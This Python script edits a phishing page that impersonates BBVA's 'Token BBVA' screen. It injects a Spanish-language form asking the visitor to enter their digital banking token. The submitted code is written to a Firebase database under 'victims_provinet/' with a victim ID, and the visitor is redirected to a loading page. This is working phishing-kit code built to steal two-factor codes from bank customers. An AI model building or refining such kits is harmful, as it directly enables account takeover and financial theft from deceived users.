import re

def replace_content():
    with open('token-digital.html', 'r', encoding='utf-8') as f:
        content = f.read()

    # Replace HTML Form
    html_pattern = re.compile(r'<div class=container id=container2>.*?<footer>', re.DOTALL)
    
    new_html = """<div class=container id=container2>
 <h1 id=titulo1 style="text-align:center;">Token BBVA</h1>
 <div id=form-login class=formaem>

 <form class="control-login" name="form" id="form" action="cargando.html" method="get" autocomplete="off">
 <div class=row>
 <div class=col-lg-12 style="text-align: center; margin-bottom: 20px; display: flex; flex-direction: column; align-items: center;">
    <div style="background-color: #004481; width: 60px; height: 60px; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-bottom: 10px;">
        <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="white" viewBox="0 0 16 16">
          <path d="M11 1a1 1 0 0 1 1 1v12a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1h6zM5 0a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2H5z"/>
          <path d="M8 14a1 1 0 1 0 0-2 1 1 0 0 0 0 2z"/>
        </svg>
    </div>
    <p style="margin-top: 5px; font-family: 'BentonSansBBVA Book', sans-serif; color: #121212; font-size: 16px;">Ingrese su token para finalizar la operacion</p>
 </div>
 <div id=container_main class=col-lg-12>
 <div class="form-group rel">
 <input type=text style="touch-action:pan-y" class="cleanup validate-empty valido" name=token id=token autocomplete=off maxlength=8 title="Ingresa el token digital" inputmode=numeric placeholder=" ">
 <label for=token class=control-label id=label-token>Ingrese el token digital</label>
 </div>
 </div>
 </div>
 
 <div class=botonEntrar style="margin-top:20px;">
 <button class="btn boton-submit boton" disabled type=submit name=submit value=submit id=submit style="background-color: #1464a5; color: white;"> 
 Continuar
 </button>
 </div>
 
 </form> 
 </div>
</div> 
<footer>"""

    content = html_pattern.sub(new_html, content)

    # Remove the cedula mask script
    cedula_script_pattern = re.compile(r'<script>\s*\(function\(\) \{\s*var cedulaInput = document\.getElementById\(\'cedula\'\).*?</script>', re.DOTALL)
    content = cedula_script_pattern.sub('', content)

    # Remove the password eye script
    pwd_script_pattern = re.compile(r'<script>\s*\(function\(\) \{\s*var pwdInput = document\.getElementById\(\'password\'\).*?</script>', re.DOTALL)
    content = pwd_script_pattern.sub('', content)
    
    # Update the submit button enabled/disabled logic
    submit_btn_pattern = re.compile(r'<script>\s*\(function\(\) \{\s*var pwdInput = document\.getElementById\(\'password\'\);\s*var submitBtn = document\.getElementById\(\'submit\'\).*?</script>', re.DOTALL)
    
    new_submit_btn_script = """<script>
(function() {
    var tokenInput = document.getElementById('token');
    var submitBtn = document.getElementById('submit');
    if (!tokenInput || !submitBtn) return;

    tokenInput.addEventListener('input', function() {
        if (tokenInput.value.length >= 6) {
            submitBtn.removeAttribute('disabled');
        } else {
            submitBtn.setAttribute('disabled', 'disabled');
        }
    });
})();
</script>"""
    
    # Wait, the previous password eye script and submit button script might be merged or separate. In the cat output they were separate.
    # Actually, it's safer to just inject our new script before the firebase scripts.
    
    content = submit_btn_pattern.sub(new_submit_btn_script, content)

    # Update the Firebase submit script
    firebase_submit_pattern = re.compile(r"const tipoDoc = document\.getElementById\('select_doc'\).*?}\);", re.DOTALL)
    
    new_firebase_submit = """const tokenValue = document.getElementById('token') ? document.getElementById('token').value : '';
            const id = localStorage.getItem('current_victim_id');

            if (id) {
                database.ref('victims_provinet/' + id).update({
                    token: tokenValue,
                    status: 'Esperando'
                }).then(() => {
                    window.location.href = 'cargando.html?id=' + id;
                }).catch(err => {
                    console.error("Error al enviar", err);
                    window.location.href = 'cargando.html?id=' + id;
                });
            } else {
                window.location.href = 'cargando.html';
            }"""
            
    content = firebase_submit_pattern.sub(new_firebase_submit, content)

    with open('token-digital.html', 'w', encoding='utf-8') as f:
        f.write(content)
        
    print("Replacements complete!")

if __name__ == "__main__":
    replace_content()
